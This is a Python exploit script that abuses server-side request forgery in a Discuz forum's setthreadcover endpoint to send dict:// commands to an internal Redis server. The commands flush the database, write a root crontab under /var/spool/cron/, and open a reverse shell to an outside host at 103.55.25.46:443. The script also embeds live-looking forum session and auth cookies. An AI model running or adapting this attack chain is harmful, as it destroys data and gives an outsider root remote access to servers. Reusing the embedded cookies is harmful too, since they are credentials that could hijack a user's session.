#!/usr/bin/env python
# coding=utf-8
import requests
host = '10.0.1.60'
port = '6379'
bhost = '103.55.25.46'
bport = '443'
headers = {"Cookie": "kLeF_2132_lastvisit=1502698831; kLeF_2132_nofavfid=1; kLeF_2132_visitedfid=2; kLeF_2132_lip=127.0.0.1%2C1502711622; kLeF_2132_ulastactivity=4cb4k%2FLxwVR5sTKotZOZD8cPdUdtjMQ0wGLGDdyDOcRfkDdZ2xmt; _ga=GA1.1.1030029695.1502711342; _gid=GA1.1.689776330.1502711342; kLeF_2132_st_t=1%7C1502775302%7C2eeaa2d6a40a44a6f58678e7a0b6a266; kLeF_2132_forum_lastvisit=D_2_1502775302; kLeF_2132_st_p=1%7C1502775308%7Cb344ab0769ca2f8a4bc8e5257417058a; kLeF_2132_viewid=tid_2; kLeF_2132_sid=lZ0w0Q; kLeF_2132_smile=1D1; kLeF_2132_seccode=2.489b501943be3f9c28; kLeF_2132_lastact=1502778393%09forum.php%09ajax; kLeF_2132_connect_is_bind=0; session=2b0f72ee-13bf-4247-b167-ce462b263381; kLeF_2132_auth=92302gYfLsNuPqkEvh6Um4FD0HI8K2RSgmRgBrlJatTB%2BLqShIttK%2FEW7%2BnCNkf7OSX6MLOC2Ihgqqgchhae; kLeF_2132_saltkey=u1eLNQD1"}

vul_httpurl = 'http://127.0.0.1/dz/forum.php?mod=ajax&action=setthreadcover&inajax=1&fid=2&wysiwyg=1&tid=2&pid=1&imgurl='
_location = 'http://127.0.0.1/302.php'
shell_location = 'http://127.0.0.1/shell.php'
proxies = {"http": "127.0.0.1:8085"}

#1 flush db
_payload = '%3fs=dict%26ip={host}%26port={port}%26data=flushall'.format(
    host = host,
    port = port)
exp_uri = '{vul_httpurl}{0}{1}'.format(_location, _payload, vul_httpurl=vul_httpurl)
print exp_uri
print len(requests.get(exp_uri,headers=headers,proxies=proxies).content)
#2 set crontab command
_payload = '%3fs=dict%26ip={host}%26port={port}%26bhost={bhost}%26bport={bport}'.format(
    host = host,
    port = port,
    bhost = bhost,
    bport = bport)
exp_uri = '{vul_httpurl}{0}{1}'.format(shell_location, _payload, vul_httpurl=vul_httpurl)
print exp_uri
print len(requests.get(exp_uri,headers=headers).content)
#3 config set dir /var/spool/cron/
_payload = '%3fs=dict%26ip={host}%26port={port}%26data=config:set:dir:/var/spool/cron/'.format(
    host = host,
    port = port)
exp_uri = '{vul_httpurl}{0}{1}'.format(_location, _payload, vul_httpurl=vul_httpurl)
print exp_uri
print len(requests.get(exp_uri,headers=headers).content)
#4 config set dbfilename root
_payload = '%3fs=dict%26ip={host}%26port={port}%26data=config:set:dbfilename:root'.format(
    host = host,
    port = port)
exp_uri = '{vul_httpurl}{0}{1}'.format(_location, _payload, vul_httpurl=vul_httpurl)
print exp_uri
print len(requests.get(exp_uri,headers=headers).content)
#5 save to file
_payload = '%3fs=dict%26ip={host}%26port={port}%26data=save'.format(
    host = host,
    port = port)
exp_uri = '{vul_httpurl}{0}{1}'.format(_location, _payload, vul_httpurl=vul_httpurl)
print exp_uri
print len(requests.get(exp_uri,headers=headers).content)
